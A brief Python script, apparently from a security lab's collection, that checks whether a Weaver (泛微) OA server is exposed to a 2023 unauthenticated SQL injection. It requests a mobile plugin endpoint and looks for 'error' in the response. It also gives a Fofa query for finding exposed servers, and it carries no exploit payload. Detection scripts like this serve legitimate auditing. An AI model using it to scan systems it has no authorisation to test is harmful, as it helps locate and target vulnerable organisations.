# -*- coding: utf-8 -*-
# 泛微OA 2023 前台 SQL注入  
# 雷石实验室收集
# Fofa:  app="泛微-协同办公OA"

import sys
import requests
import urllib3
import time
from rich.console import Console


console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    target_url = target_url + "/mobile/plugin/CheckServer.jsp?type=mobileSetting"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
    console.print(now_time() + " [INFO]     正在检测泛微sql-2023注入漏洞", style='bold blue')
    try:
        res = requests.get(url=target_url, headers=headers, verify=False, timeout=10)
        if res.status_code == 200 and "error" in res.text :
            console.print(now_time() + " [SUCCESS]     存在泛微sql-2023注入漏洞暂无可利用exp", style='bold green')
        else:
            console.print(now_time() + " [WARNING]  不存在注入", style='bold red')
    except Exception as e:
        console.print(now_time() + " [ERROR]    目标请求失败 ", style='bold red')


